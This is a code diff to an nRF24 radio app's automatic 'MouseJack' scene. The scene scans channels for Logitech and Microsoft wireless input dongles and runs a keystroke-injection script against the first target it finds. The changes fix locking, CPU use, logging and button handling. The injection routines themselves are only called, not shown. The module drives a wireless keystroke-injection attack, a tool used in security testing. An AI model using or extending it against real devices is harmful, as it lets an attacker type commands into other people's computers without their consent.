@@ -4,7 +4,6 @@
 #include "../helpers/nrf24_mj_ducky.h"
 
 #include <furi.h>
-#include <esp_rom_sys.h>
 #include <string.h>
 
 #define TAG "Nrf24MjAuto"
@@ -12,7 +11,6 @@
 #define MJ_AUTO_CH_MIN     2
 #define MJ_AUTO_CH_MAX     84
 #define MJ_AUTO_TRIES_PER_CH 6
-#define MJ_AUTO_DWELL_US   500
 #define MJ_AUTO_SCAN_TIMEOUT_MS 60000 /* give up after a minute */
 
 typedef struct {
@@ -24,29 +22,45 @@ typedef struct {
 
 static Nrf24MjAutoCtx* g_ctx = NULL;
 
+static bool mj_auto_should_stop(Nrf24MjAutoCtx* ctx) {
+    return ctx->stop;
+}
+
 /* Scan one channel; return >=0 (target index) on hit, -1 otherwise. */
-static int auto_scan_one_channel(Nrf24App* app, uint8_t ch) {
+static int auto_scan_one_channel(Nrf24MjAutoCtx* ctx, uint8_t ch) {
+    Nrf24App* app = ctx->app;
     nrf24_hw_acquire();
     nrf24_hw_ce(false);
     nrf24_hw_set_channel(ch);
     nrf24_hw_flush_rx();
     nrf24_hw_ce(true);
+    nrf24_hw_release();
 
     int hit = -1;
-    for(int t = 0; t < MJ_AUTO_TRIES_PER_CH; t++) {
-        esp_rom_delay_us(MJ_AUTO_DWELL_US);
+    for(int t = 0; t < MJ_AUTO_TRIES_PER_CH && !mj_auto_should_stop(ctx); t++) {
+        /* Yield the worker core while listening; busy-waiting here made a
+         * full-band scan consume most of a core for the whole timeout. */
+        furi_delay_ms(1);
+        if(mj_auto_should_stop(ctx)) break;
+        nrf24_hw_acquire();
         if(nrf24_hw_rx_data_ready()) {
             uint8_t buf[32];
-            nrf24_hw_rx_read_payload(buf, sizeof(buf));
-            int idx = mj_fingerprint(
-                buf, sizeof(buf), ch, app->mj_targets, &app->mj_target_count);
-            if(idx >= 0) {
-                hit = idx;
-                break;
+            /* 0 return = SPI read failed, buf has no real data → skip it. */
+            if(nrf24_hw_rx_read_payload(buf, sizeof(buf)) != 0) {
+                nrf24_hw_release();
+                int idx =
+                    mj_fingerprint(buf, sizeof(buf), ch, app->mj_targets, &app->mj_target_count);
+                if(idx >= 0) {
+                    hit = idx;
+                    break;
+                }
+            } else {
+                nrf24_hw_release();
             }
+        } else {
+            nrf24_hw_release();
         }
     }
-    nrf24_hw_release();
     return hit;
 }
 
@@ -83,6 +97,9 @@ static int32_t mj_auto_worker(void* context) {
                     model->error_text, "Cannot open script", sizeof(model->error_text) - 1);
             },
             true);
+        nrf24_hw_acquire();
+        nrf24_hw_power_down();
+        nrf24_hw_release();
         nrf24_hw_deinit();
         return 0;
     }
@@ -112,10 +129,19 @@ static int32_t mj_auto_worker(void* context) {
 
     int target_idx = -1;
     uint32_t scan_start = furi_get_tick();
-    while(!ctx->stop && target_idx < 0 &&
+    uint32_t last_progress_tick = scan_start;
+    FURI_LOG_I(
+        TAG,
+        "Auto scan started channels=%u..%u timeout=%u ms",
+        (unsigned)MJ_AUTO_CH_MIN,
+        (unsigned)MJ_AUTO_CH_MAX,
+        (unsigned)MJ_AUTO_SCAN_TIMEOUT_MS);
+    while(!mj_auto_should_stop(ctx) && target_idx < 0 &&
           (furi_get_tick() - scan_start) < pdMS_TO_TICKS(MJ_AUTO_SCAN_TIMEOUT_MS)) {
-        for(uint8_t ch = MJ_AUTO_CH_MIN; ch <= MJ_AUTO_CH_MAX && !ctx->stop; ch++) {
-            int idx = auto_scan_one_channel(app, ch);
+        for(uint8_t ch = MJ_AUTO_CH_MIN; ch <= MJ_AUTO_CH_MAX &&
+                                          !mj_auto_should_stop(ctx);
+            ch++) {
+            int idx = auto_scan_one_channel(ctx, ch);
             if(idx >= 0) {
                 target_idx = idx;
                 break;
@@ -126,9 +152,31 @@ static int32_t mj_auto_worker(void* context) {
                     Nrf24MjAttackModel * model,
                     { model->current_channel = ch; },
                     true);
+                uint32_t now = furi_get_tick();
+                if((now - last_progress_tick) >= pdMS_TO_TICKS(5000)) {
+                    FURI_LOG_I(
+                        TAG,
+                        "Auto scan progress channel=%u targets=%u elapsed_ticks=%lu",
+                        (unsigned)ch,
+                        (unsigned)app->mj_target_count,
+                        (unsigned long)(now - scan_start));
+                    last_progress_tick = now;
+                }
             }
+            /* This scanner otherwise spins continuously for up to a minute.
+             * Give GUI/input and other radio service tasks a scheduling window
+             * after each channel's SPI lock has been released. */
+            furi_delay_ms(1);
         }
     }
+
+    FURI_LOG_I(
+        TAG,
+        "Auto scan ended target=%d stopped=%u targets=%u elapsed_ticks=%lu",
+        target_idx,
+        (unsigned)mj_auto_should_stop(ctx),
+        (unsigned)app->mj_target_count,
+        (unsigned long)(furi_get_tick() - scan_start));
 
     nrf24_hw_acquire();
     nrf24_hw_rx_stop();
@@ -142,7 +190,7 @@ static int32_t mj_auto_worker(void* context) {
                 model->phase = MjAttackPhaseError;
                 strncpy(
                     model->error_text,
-                    ctx->stop ? "Aborted" : "No target found",
+                    mj_auto_should_stop(ctx) ? "Aborted" : "No target found",
                     sizeof(model->error_text) - 1);
             },
             true);
@@ -167,23 +215,26 @@ static int32_t mj_auto_worker(void* context) {
         },
         true);
 
-    /* Switch to TX, fire script. */
-    nrf24_hw_acquire();
+    /* Switch to TX, fire script. mj_setup_tx_for_target/mj_logitech_wake/
+     * mj_inject_keystroke/mj_script_step each claim nrf24_hw_acquire()/
+     * release() internally for just their SPI burst — do NOT wrap this block
+     * (or the script loop below) in an outer acquire/release. On a
+     * shared-SPI board that also takes the global LCD/SD bus lock, and a
+     * script line can be a DELAY of up to 60 s or a multi-second STRING;
+     * holding the bus across that froze the display/input for the whole
+     * duration (the bug this comment replaces). */
     mj_setup_tx_for_target(target);
     mj_logitech_wake(target);
     mj_reset_ms_sequence();
     if(target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt) {
-        for(int i = 0; i < 6 && !ctx->stop; i++) {
+        for(int i = 0; i < 6 && !mj_auto_should_stop(ctx); i++) {
             mj_inject_keystroke(target, 0, 0);
             furi_delay_ms(2);
         }
     }
-    nrf24_hw_release();
 
-    while(!ctx->stop && !mj_script_done(ctx->script)) {
-        nrf24_hw_acquire();
+    while(!mj_auto_should_stop(ctx) && !mj_script_done(ctx->script)) {
         bool more = mj_script_step(ctx->script, target, &ctx->stop);
-        nrf24_hw_release();
 
         with_view_model(
             app->mj_attack_view,
@@ -210,7 +261,7 @@ static int32_t mj_auto_worker(void* context) {
     nrf24_hw_release();
     nrf24_hw_deinit();
 
-    if(!ctx->stop) {
+    if(!mj_auto_should_stop(ctx)) {
         with_view_model(
             app->mj_attack_view,
             Nrf24MjAttackModel * model,
@@ -227,6 +278,10 @@ void nrf24_app_scene_mj_auto_on_enter(void* context) {
     app->mj_selected_target = -1;
 
     Nrf24MjAutoCtx* ctx = malloc(sizeof(Nrf24MjAutoCtx));
+    if(!ctx) {
+        FURI_LOG_E(TAG, "No memory for auto context");
+        return;
+    }
     memset(ctx, 0, sizeof(*ctx));
     ctx->app = app;
     g_ctx = ctx;
@@ -254,10 +309,24 @@ void nrf24_app_scene_mj_auto_on_enter(void* context) {
 }
 
 bool nrf24_app_scene_mj_auto_on_event(void* context, SceneManagerEvent event) {
-    UNUSED(context);
+    Nrf24App* app = context;
     if(event.type != SceneManagerEventTypeCustom || !g_ctx) return false;
     if(event.event == Nrf24MjAttackEventStop) {
-        g_ctx->stop = true;
+        /* The center (OK) button is the only key the view sends. The footer
+         * shows "Stop" only while Scanning/Running and "Back" otherwise, so OK
+         * must match: abort the active run, or leave the scene once it has
+         * finished (Done/Error/Idle). Without this, a finished run showed
+         * "Back" but OK only re-asserted the stop flag — a dead button that
+         * trapped the user until they pressed the physical Back key. */
+        MjAttackPhase phase;
+        with_view_model(
+            app->mj_attack_view, Nrf24MjAttackModel * model, { phase = model->phase; }, false);
+        if(phase == MjAttackPhaseScanning || phase == MjAttackPhaseRunning) {
+            g_ctx->stop = true;
+        } else {
+            /* on_exit joins the (already finished) worker and frees g_ctx. */
+            scene_manager_previous_scene(app->scene_manager);
+        }
         return true;
     }
     return false;
